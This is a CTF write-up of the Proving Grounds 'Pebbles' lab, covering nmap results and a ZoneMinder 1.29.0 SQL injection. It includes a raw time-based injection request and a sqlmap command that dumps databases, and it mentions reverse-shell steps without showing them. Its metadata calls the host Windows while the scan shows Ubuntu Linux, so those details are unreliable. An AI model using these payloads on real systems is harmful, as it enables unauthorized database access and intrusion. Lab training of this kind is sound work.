---
title: "PG Practice: Pebbles"
created: "2023-08-18"
updated: "2026-04-11"
type: ctf-writeup
platform: Proving Grounds Practice
machine: "Pebbles"
os: Windows
status: rooted
tags:
  - - proving-grounds
  - pg-practice
  - windows
  - ctf
  - oscp
  - reverse-shell
  - searchsploit--exploit-db
  - sqlmap
  - sql-injection
related:
  - "[[Reverse-Shell-Reference]]"
  - "[[Searchsploit-and-CVE-Workflow]]"
  - "[[SQLi-to-RCE-Attack-Chains]]"
  - "[[Windows-PrivEsc-Decision-Tree]]"
  - "[[Nmap-Enumeration-Methodology]]"
---

# PG Practice: Pebbles

> **Platform:** Proving Grounds Practice | **OS:** Windows | **Date:** 2023-08-18

---

## Quick Summary

**Open Ports:**
- 21/tcp (ftp)
- 22/tcp (ssh)
- 80/tcp (http)
- 3305/tcp (http)
- 8080/tcp (http)

**Key Techniques:**
- Reverse Shell
- Searchsploit / Exploit-DB
- SQLmap
- SQL Injection

**Privilege Escalation Path:**
- Kernel exploit

---

## Full Walkthrough

Proving grounds Practice - Pebbles CTF writeup.

## Nmap

```sh
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 aacf5a9347180e7f3d6da5aff86aa51e (RSA)
|   256 c7636c8ab5a76f05bfd0e390b5b89658 (ECDSA)
|_  256 93b26a1163861b5ef5895852897ff342 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 7EC7ACEA6BB719ECE5FCE0009B57206B
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Pebbles
3305/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Tomcat
|_http-favicon: Apache Tomcat
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Directory Fuzzing


**ZoneMinder v1.29.0**


Zoneminder v1.29.0 is vulnerable to SQL Injection vulnerability.

**Searchsploit**


## Construct and Exploit SQL Injection vulnerability

### Request

```http
POST /zm/index.php HTTP/1.1
Host: 192.168.210.52
Content-Length: 112
Accept: application/json
X-Requested-With: XMLHttpRequest
X-Request: JSON
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Content-type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.210.52
Referer: http://192.168.210.52/zm/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: zmSkin=classic; zmCSS=classic; ZMSESSID=e6s5540cs098ev3kra5sksjme6
Connection: close

view=request&request=log&task=query&limit=100;(SELECT * FROM (SELECT(SLEEP(5)))OQkj)#&minTime=1466674406.084434
```

### Response


The vulnerability says the `limit` parameter is vulnerable and automate the exploit using sqlmap.

```sh
sqlmap -u http://192.168.210.52/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=1" -p limit --batch --dbs --risk 3 --level 4
```


**Obtain reverse shell via sqlmap**


**Transfer nc and obtain reverse shell**


**Root Obtained**

Use PORT `3305` to get reverse connection sucessfully. Other ports are not allowed in the system.

---

## Technique Links

- [[Reverse-Shell-Reference]]
- [[Searchsploit-and-CVE-Workflow]]
- [[SQLi-to-RCE-Attack-Chains]]
- [[Windows-PrivEsc-Decision-Tree]]
- [[Nmap-Enumeration-Methodology]]
- [[Proving-Grounds-Master-Index]]
